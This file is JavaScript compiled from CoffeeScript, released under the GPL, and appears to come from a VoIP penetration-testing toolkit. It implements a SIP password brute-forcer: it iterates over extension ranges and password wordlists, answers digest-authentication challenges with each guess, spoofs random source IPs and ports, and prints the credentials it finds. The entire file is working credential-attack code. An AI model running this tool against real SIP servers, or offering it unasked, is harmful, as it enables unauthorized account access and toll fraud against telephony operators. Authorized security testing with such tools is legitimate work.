// Generated by CoffeeScript 1.6.3
/*

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

var AsteroidsConn, EventEmitter, Grammar, Parser, Printer, SipBrutePass, SipMessage, Utils, fs, _ref,
  __hasProp = {}.hasOwnProperty,
  __extends = function(child, parent) { for (var key in parent) { if (__hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor(); child.__super__ = parent.prototype; return child; };

SipMessage = require("../tools/sipMessage.coffee").SipMessage;

AsteroidsConn = require("../tools/asteroidsConn.coffee").AsteroidsConn;

Parser = require("../tools/parser.coffee").Parser;

Printer = require("../tools/printer.coffee").Printer;

Utils = require("../tools/utils.coffee").Utils;

Grammar = require("../tools/grammar").Grammar;

EventEmitter = require("events").EventEmitter;

fs = require("fs");

exports.SipBrutePass = SipBrutePass = (function(_super) {
  var brute, oneBrute, parseReply, printBrutePass,
    _this = this;

  __extends(SipBrutePass, _super);

  function SipBrutePass() {
    _ref = SipBrutePass.__super__.constructor.apply(this, arguments);
    return _ref;
  }

  SipBrutePass.emitter = new EventEmitter;

  printBrutePass = function(ext, pass) {
    Printer.info("\nPassword found (ext. ");
    Printer.infoHigh("" + ext);
    Printer.info("): ");
    return Printer.result("" + pass + "\n");
  };

  parseReply = function(msg, testExt, testPass, type) {
    var code;
    code = Parser.parseCode(msg);
    switch (code) {
      case "200":
        if ((type === "REGISTER" || type === "PUBLISH")) {
          return printBrutePass(testExt, testPass);
        }
        break;
      case "404":
        if ((type !== "REGISTER" && type !== "PUBLISH")) {
          return printBrutePass(testExt, testPass);
        }
        break;
      default:
        Printer.highlight("Last tested combination ");
        Printer.normal("\"" + testExt + "\"/\"" + testPass + "\"\n");
        return Printer.removeCursor();
    }
  };

  oneBrute = function(target, port, path, srcHost, transport, type, testExt, password) {
    var callId, conn, cseq, gruuInstance, lport, msgObj, msgSend, toExt;
    cseq = 1;
    callId = "" + (Utils.randomString(16));
    if (Utils.isIP6(target)) {
      srcHost = srcHost || Utils.randomIP6();
    } else {
      srcHost = srcHost || Utils.randomIP();
    }
    lport = lport || Utils.randomPort();
    toExt = Utils.randomString(3);
    gruuInstance = "urn:uuid:" + (Utils.randomString(3)) + "-" + (Utils.randomString(4)) + "-" + (Utils.randomString(8));
    msgObj = new SipMessage(type, "", target, port, srcHost, lport, testExt, toExt, transport, "", "", "", false, cseq, callId, gruuInstance, "", "", "");
    msgSend = String(msgObj.create());
    conn = new AsteroidsConn(target, port, path, transport, lport);
    conn.on("newMessage", function(stream) {
      var code, conn1, parsedAuth;
      code = Parser.parseCode(stream);
      if (code === "401" || code === "407") {
        parsedAuth = Parser.parseRealmNonce(stream);
        if (parsedAuth) {
          msgObj = new SipMessage(type, "", target, port, srcHost, lport, testExt, toExt, transport, parsedAuth.realm, parsedAuth.nonce, password, parsedAuth.isProxy, cseq + 1, callId, gruuInstance, "", "", "");
          msgSend = String(msgObj.create());
          conn1 = new AsteroidsConn(target, port, path, transport, lport);
          conn1.on("newMessage", function(stream) {
            return parseReply(stream, testExt, password, type);
          });
          conn1.on("error", function(error) {
            return Printer.error("SipBrutePass: " + error);
          });
          return conn1.send(msgSend);
        } else {
          return Printer.error("SipBrutePass: No auth line provided by the server.");
        }
      }
    });
    conn.on("error", function(error) {
      return Printer.error("SipBrutePass: " + error);
    });
    return conn.send(msgSend);
  };

  brute = function(target, port, path, srcHost, transport, type, testExt, passwords, delay) {
    if (Grammar.fileRE.exec(passwords)) {
      return fs.readFile(passwords, function(err, data) {
        var doLoopString, splitData;
        if (err) {
          return Printer.error("sipBrutePass: readFile(): " + err);
        } else {
          splitData = data.toString().split("\n");
          doLoopString = function(i) {
            return setTimeout(function() {
              oneBrute(target, port, path, srcHost, transport, type, testExt, splitData[i]);
              if (i < splitData.length - 1) {
                return doLoopString(parseInt(i, 10) + 1);
              } else {
                return SipBrutePass.emitter.emit("passBlockEnd", "Block of passwords ended");
              }
            }, delay);
          };
          return doLoopString(0);
        }
      });
    } else {
      oneBrute(target, port, path, srcHost, transport, type, testExt, passwords);
      return SipBrutePass.emitter.emit("passBlockEnd", "Block of passwords ended");
    }
  };

  SipBrutePass.run = function(target, port, path, srcHost, transport, type, extensions, delay, passwords) {
    var i, rangeExtParsed,
      _this = this;
    Printer.normal("\n");
    if (/:/.test(target)) {
      target = Utils.normalize6(target);
    }
    if (Grammar.extRangeRE.exec(extensions)) {
      rangeExtParsed = Parser.parseExtRange(extensions);
      i = parseInt(rangeExtParsed.minExt, 10);
      this.emitter.on("passBlockEnd", function(msg) {
        if (i < parseInt(rangeExtParsed.maxExt, 10)) {
          i += 1;
          return brute(target, port, path, srcHost, transport, type, i, passwords, delay);
        }
      });
      return brute(target, port, path, srcHost, transport, type, rangeExtParsed.minExt, passwords, delay);
    } else {
      if (Grammar.fileRE.exec(extensions)) {
        return fs.readFile(extensions, function(err, data) {
          var splitData;
          if (err) {
            return Printer.error("sipBrutePass: readFile(): " + err);
          } else {
            i = 0;
            splitData = data.toString().split("\n");
            _this.emitter.on("passBlockEnd", function(msg) {
              if (i < splitData.length - 1) {
                i += 1;
                return brute(target, port, path, srcHost, transport, type, splitData[i], passwords, delay);
              }
            });
            return brute(target, port, path, srcHost, transport, type, splitData[i], passwords, delay);
          }
        });
      } else {
        return brute(target, port, path, srcHost, transport, type, extensions, passwords, delay);
      }
    }
  };

  return SipBrutePass;

}).call(this, EventEmitter);
